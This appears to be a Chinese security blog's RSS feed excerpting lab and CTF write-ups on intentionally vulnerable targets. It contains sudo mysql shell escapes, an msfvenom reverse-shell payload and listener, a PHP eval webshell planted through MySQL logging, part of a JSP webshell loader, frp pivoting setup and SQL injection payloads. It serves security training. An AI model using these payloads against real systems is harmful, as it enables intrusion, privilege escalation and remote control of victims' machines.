<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>ThnPinkman’s blog</title>
        <link>https://thnpkm.github.io/</link>
        <description>只是向上走</description>
        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 22 Aug 2024 23:51:36 &#43;0800</lastBuildDate>
            <atom:link href="https://thnpkm.github.io/index.xml" rel="self" type="application/rss+xml" />
        <item>
    <title>春秋云镜 Initial</title>
    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/</link>
    <pubDate>Thu, 22 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/</guid>
    <description><![CDATA[春秋云镜 Initial 外网打点 站点图标很好判断是TP的站
拿TP漏洞利用工具试一下
getshell
一般的目录下没有flag，即继续看能不能提权
提权 首先尝试能不能suid提权
感觉没有好利用的
查看linux的信息 这种流程走一遍
uname -a 查看系统全部信息 # Linux ubuntu-web01 5.4.0-110-generic #124-Ubuntu SMP Thu Apr 14 19:46:19 UTC 2022 x86_64 x86_64 x86_64 GNU/Linuxuname -r 查看内核版本 # 5.4.0-110-generic 可以用kali的自带工具searchsploit 找对应版本的提权，无果
继续可以看 sudo
sudo -l 列出目前用户可执行与无法执行的指令 (root) NOPASSWD: /usr/bin/mysql https://mp.weixin.qq.com/s/9iZiOq1rT0E3QiB4VAQtzg上面的文章提到 以上结果列出了mysql，就可以使用 sudo mysql -e &lsquo;! /bin/sh&rsquo; 获得一个特权shell，或者 sudo -u root mysql -e &lsquo;! /bin/sh&rsquo;
这种格式可以执行root权限命令，来找一下flag
sudo mysql -e &#39;\! find / -name flag*&#39; 读flag]]></description>
</item>
<item>
    <title>CFS三层靶机</title>
    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/cfs%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/</link>
    <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/cfs%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/</guid>
    <description><![CDATA[CFS三层靶机 0X01配置环境 分别打开三台靶机，输入账号密码进入
rootteamssix.com 查看三台靶机的ip地址，
确保Target1一个在192.168.1.0网段、另一个在192.168.22.0网段
确保Target2在192.168.1.0、192.168.22.0、192.168.33.0网段
确保Target3在192.168.33.0网段
确保kali2022在192.168.1.0网段
确认完毕后来到jkali，通过192.168.1.0网段的IP地址打开Tagrget1的宝塔面板
地址：http://targ1的IP:8888/a768f109/账号：eaj3yhsl密码：41bb8fee 打开192.168.1.130的80端口，确保kali可以访问到
Target2也同理，账号密码如下
地址：http://你的IP:8888/2cc52ec0/账号：xdynr37d密码：123qwe.. 配置22网段 我这里是192.168.22.128
然后删除Targ2的1网段网卡，因为1网段用途就是方便kali配Targ2的环境
目前环境配置完成
攻击机kali: 192.168.1.128Targ1 CentOS: 192.168.1.130 192.168.22.129Targ2 Ubuntu: 192.168.22.128 192.168.33.128 Targ3 Windows: 192.168.33.33 0X02信息收集getshell 主机探活
扫描kali同网段的主机
发现192.168.1.130，以及带出一些端口，这就是Targ1，我们对其进行渗透
访问80端口找可利用点
ThinkPHP5的框架，那就找框架的漏洞呗
直接上工具梭
上传马
成功getshell
0x03内网渗透 上线msf 生成linux木马
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.129 LPORT=4444 -f elf&gt;1.elf 上传到蚁剑
msf监听
msfdb runuse exploit/multi/handler set payload linux/x64/meterpreter/reverse_tcpset LHOST 192.168.1.128set LPORT 4444exploit 执行1.]]></description>
</item>
<item>
    <title>三层靶机frp</title>
    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BAfrp/</link>
    <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BAfrp/</guid>
    <description><![CDATA[https://blog.csdn.net/qq_61237064/article/details/125602997参考此文搭建环境
环境拓扑 kali : 192.168.1.133targ1: 192.168.1.135 192.168.22.134 (centos)targ2: 192.168.22.133 192.168.33.130 (ubuntu)targ3: 192.168.33.33 (win7) 靶机1渗透 信息收集 主机探活 + 端口扫描
nmap 192.168.1.0/24 拿到targ1的ip，且开放了80端口
外网打点 先访问靶机1的80端口
tp5 直接工具梭
顺利拿到shell
蚁剑查看网络
内网收集 得到22网段，既然发现了存在192.168.22.x/24 网段，所以尝试对 22 网段进行信息收集，这里使用fscan
上传fscan 到targ1服务器目录/tmp （如果有杀软容易寄）
./fscan -h 192.168.22.0/24 -o fscan.log 可以看到192.168.22.133是Target2，还是某个cms的站，80端口开发
有两种方式进行利用：
1.对 Target 2 80 端口进行端口转发。 2.使用反向代理，将Target 1 的网络通过vps代理出去。
代理转发—重点 使用frp方式。
frp存在服务端（frps）与客户端（frpc）， frps需要一直保持运行，转发方式通过客户端配置文件进行确定。
一级代理
配置服务端frps.ini
[common] bind_addr = 0.0.0.0 # 在服务端上绑定的ip bind_port = 7000 # 在服务端上绑定的端口 启动服务端]]></description>
</item>
<item>
    <title>红日靶场 1</title>
    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/</link>
    <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/</guid>
    <description><![CDATA[红日靶场 1 01环境配置 在 VMware 中选择虚拟网络编辑器设置内网网段192.168.52.0/24，NAT 和DHCP都要设置
win7上要多添加一个桥接网卡可以分配一个真实ip
三台靶机的默认开机密码都为hongrisec@2019
win7就用默认密码了 ，其他两个需要修改密码，我修改成hongrisec@2022
win7提示重启，重启后打开phpstudy
ipconfig查看
可以看到分配的真实ip
访问ip得到phpstudy探针，本机也可以
同时我们需要保持外网、域网络防火墙为未开启状态
02信息收集 探测内网存活 netdiscover -i eth0 -r 192.168.52.0/24 nmap扫描端口 nmap -Pn -sV -p- -A 192.168.52.143 --min-rate=1000 扫端口，可以利于80,3306
80端口也就是刚才的phpstudy探针，可以看看有无利于点
最下面有个mysql数据库连接检测的功能，root/root 最简单的弱口令 发现检测成功
那去找一下mysql的后台登录页面，
dirsearch扫描目录 可以看到不少phpmyadmin，找到后台 弱口令就登录进来了
查看日志权限 show variables like &#39;general%&#39; set global general_log= &#34;ON&#34;; 打开权限set global general_log_file=&#34;C:/phpStudy/WWW/123.php&#34;; 设置查看日志的文件，文件路径可以在探针看 03Getshell 利用日志文件getshell sql语句执行 select &quot;&lt;?php phpinfo();?&gt;&quot; ;
访问刚才定义的日志页面 ，可以getshell
传入shell ,连接蚁剑
select &#34;&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;&#34; ; Yxcms后台登录getshell mysql后台看到有个newyxcms的数据库]]></description>
</item>
<item>
    <title>红日靶场2</title>
    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/</link>
    <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/</guid>
    <description><![CDATA[红日靶场2 拓扑图 默认密码：1qaz@WSX
0x01环境搭建 我是参考此视频
https://www.bilibili.com/video/BV1De4y1a7Ps/?spm_id_from=333.337.search-card.all.click&vd_source=cf73ac8de9b7c0322b1bccf77de91c5dnat模式分配111段
自定义一个10.10.10.x 的网络 我命名为VMnet5
进入WEB中，来到C:\Oracle\Middleware\user_projects\domains\base_domain\bin 路径 以管理员权限执行startWebLogic
0x02信息收集 端口扫描 这个命令显示更详细，可以看到不少的服务都打开了
漏洞探测 80端口是空白，这边先重点关注一下7001 Oracle WebLogic Server
跳转到404
尝试使用WeblogicScan脚本探测漏洞：
python3 WeblogicScan.py -u 192.168.111.80 -p 7001 有合适的cve
github准备好exp工具进行利用
-u 检测 -f上传木马
得到一个url 可以直接执行命令
上帝视角去看靶机的shell.jsp的文件位置
C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat\54p17w\war
传入马比较棘手且比赛也没有上帝视角，另寻其他方法
getShell 找到个工具weblogic漏洞检测工具
输入url就能扫漏洞，然后命令执行，最好用的是可以文件上传，这里传入一个蚁剑的jsp马
&lt;%!class U extends ClassLoader {U(ClassLoader c) {super(c);}public Class g(byte[] b) {return super.defineClass(b, 0, b.length);}}public byte[] base64Decode(String str) throws Exception {try {Class clazz = Class.]]></description>
</item>
<item>
    <title>0xgame2022</title>
    <link>https://thnpkm.github.io/posts/ctf/0xgame2022/</link>
    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/0xgame2022/</guid>
    <description><![CDATA[do_u_like_pop &lt;?php highlight_file(__FILE__); class Apple{ public $var; public function __wakeup(){ $this-&gt;var-&gt;value; } public function __invoke(){ echo $this-&gt;var; } } class Banana{ public $source=&#34;pop.php&#34;; public $str; public function __toString(){ echo file_get_contents($this-&gt;source); return &#39;do u like pop?&#39;; } public function __construct(){ $this-&gt;source = &#34;flag in flag.php&#34;; echo 123; } } class Cherry{ public $p; public $o; public function __construct(){ $this-&gt;o = &#39;pop song&#39;; } public function __get($key){ ($this-&gt;p)(); } } if(isset($_GET[&#39;pop&#39;])){ @unserialize($_GET[&#39;pop&#39;]); } 简单的反序列化链子]]></description>
</item>
<item>
    <title>2020羊城杯</title>
    <link>https://thnpkm.github.io/posts/ctf/2020%E7%BE%8A%E5%9F%8E%E6%9D%AF/</link>
    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/2020%E7%BE%8A%E5%9F%8E%E6%9D%AF/</guid>
    <description><![CDATA[WEB easycon 打开就是
扫出来个index.php 然后访问
提示eval post cmd，看来是post了个cmd可以执行命令
找到bbbbbbbbb.txt文件，用base64解码得到包含flag的图片
easyphp 源码
&lt;?php $files = scandir(&#39;./&#39;); foreach($files as $file) { if(is_file($file)){ if ($file !== &#34;index.php&#34;) { unlink($file); } } } if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) { highlight_file(__FILE__); die(); } $content = $_GET[&#39;content&#39;]; if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) { echo &#34;Hacker&#34;; die(); } $filename = $_GET[&#39;filename&#39;]; if(preg_match(&#34;/[^a-z\.]/&#34;, $filename) == 1) { echo &#34;Hacker&#34;; die(); } $files = scandir(&#39;./&#39;); foreach($files as $file) { if(is_file($file)){ if ($file !]]></description>
</item>
<item>
    <title>2023巅峰极客</title>
    <link>https://thnpkm.github.io/posts/ctf/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</link>
    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</guid>
    <description><![CDATA[web hellsql 测试后发现没有啥有用的回显，只有触发了waf才回显nonono
只要没触发waf不论sql语句是否正确都只回显： 泰酷辣！
所以没有布尔回显的话，布尔盲注不可行。
想去时间盲注，发现sleep等常用的关键字被禁的很严，尝试去绕过，失败
想去写shell，union被过滤的也很严，绕过无果
最后wp还是时间盲注，不过是用笛卡尔积
话说笛卡尔积确实在当初学mysql 的时候学到过，早已淡忘。现在来看看这个是什么样的思路：
具体的方式就是将简单的表查询不断的叠加，使之以指数倍运算量的速度增长，不断增加系统执行 sql 语句的负荷，直到产生攻击者想要的时间延迟，这就非常的类似于 dos 这个系统
unserialize 反序列化字符逃逸
misc findme find.dmp文件
010里
Netfilx图片格式
avif的文件头 66 74 79 70 61 76 69 66
手动分离出avif图片
生物 脑洞题
两张相同图片。盲水印
得到信息：甲硫氨酸
某个图片后面拿到一串氨基酸缩写
MFFMNMMFGHMMQWEMMTMMPMDFMMYMMRMKKKMMLMMGMPMPMMMMSMMVMMGMGMMMQMQMQMMMQMMMMEMEMEMEMMMMWMMMTMMMMPMMMDMNMNMMMMTMMMNMNMMNMNMMGMMGMGMGMGMMMMHMKMLMAMMMMAMAMAMSMSMSMMSMMYMYMMYMMYMMHMMVMVMMMMVMMRMMMRMAMAMMAMMAMMQMMMQMEMYMYMMM 甲硫氨酸对应的缩写是 M
到这里就挺迷惑的了
也想到了找M对应的下标
0 3 5 6 10 11 15 16 18 19 21 24 25 27 28 30 34 35 37 38 40 42 44 45 46 47 49 50 52 53 55 57 58 59 61 63 65 66 67 69 70 71 72 74 76 78 80 81 82 83 85 86 87 89 90 91 92 94 95 96 98 100 102 103 104 105 107 108 109 111 113 114 116 118 119 121 122 124 126 128 130 131 132 133 135 137 139 141 142 143 144 146 148 150 152 154 156 157 159 160 162 164 165 167 168 170 171 173 174 176 178 179 180 181 183 184 186 187 188 190 192 194 195 197 198 200 201 203 204 205 207 209 211 213 214 215 后面提示了找位置，但是没想到最后还是搞bin]]></description>
</item>
<item>
    <title>b01lers CTF</title>
    <link>https://thnpkm.github.io/posts/ctf/b01lers-ctf/</link>
    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/b01lers-ctf/</guid>
    <description><![CDATA[2023 web warmup 是一个flask的站，访问文件需要先base64编码
/app.py编码拿到源码
from base64 import b64decode import flask app = flask.Flask(__name__) @app.route(&#39;/&lt;name&gt;&#39;) def index2(name): name = b64decode(name) if (validate(name)): return &#34;This file is blocked!&#34; try: file = open(name, &#39;r&#39;).read() except: return &#34;File Not Found&#34; return file @app.route(&#39;/&#39;) def index(): return flask.redirect(&#39;/aW5kZXguaHRtbA==&#39;) def validate(data): if data == b&#39;flag.txt&#39;: return True return False if __name__ == &#39;__main__&#39;: app.run() 这里对flag.txt做了严格过滤，当时的思路还是什么加空格换行绕过，不过相对路径就可以绕过。
./flag.txt相对路径，即可绕过检测
fishy-motd 2020 web Welcome to Earth 之前buu写过了
抓包一直找路由，一直走
最后拿到flag]]></description>
</item>
<item>
    <title>BUUCTF NewStarCTF</title>
    <link>https://thnpkm.github.io/posts/ctf/buuctf-newstarctf/</link>
    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/buuctf-newstarctf/</guid>
    <description><![CDATA[week2 Word-For-You(2 Gen) 哇哇哇，我把查询界面改了，现在你们不能从数据库中拿到东西了吧哈哈（不过为了调试的代码似乎忘记删除了
联合查询 ，没有回显点
报错查询
name=1&#39;and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ name=1&#39;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+ name=1&#39;and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;wfy_comments&#39;),0x7e),1)--+ name=1&#39;and updatexml(1,concat(0x7e,(select right(group_concat(text),28) from wfy.wfy_comments),0x7e),1)--+ IncludeOne 文件包含漏洞系列第一题，也不知道是不是真的随机？ 出题人丢给你了一个工具：https://www.openwall.com/php_mt_seed/
&lt;?php highlight_file(__FILE__); error_reporting(0); include(&#34;seed.php&#34;); //mt_srand(*********); echo &#34;Hint: &#34;.mt_rand().&#34;&lt;br&gt;&#34;; if(isset($_POST[&#39;guess&#39;]) &amp;&amp; md5($_POST[&#39;guess&#39;]) === md5(mt_rand())){ if(!preg_match(&#34;/base|\.\./i&#34;,$_GET[&#39;file&#39;]) &amp;&amp; preg_match(&#34;/NewStar/i&#34;,$_GET[&#39;file&#39;]) &amp;&amp; isset($_GET[&#39;file&#39;])){ //flag in `flag.php` include($_GET[&#39;file&#39;]); }else{ echo &#34;Baby Hacker?&#34;; } }else{ echo &#34;No Hacker!&#34;; } Hint: 1219893521 给了mt_rand，用提示给的网站工具，进行爆破
拿到正确的种子
&lt;?php mt_srand(1145146); mt_rand(); echo mt_rand(); ?]]></description>
</item>
</channel>
</rss>
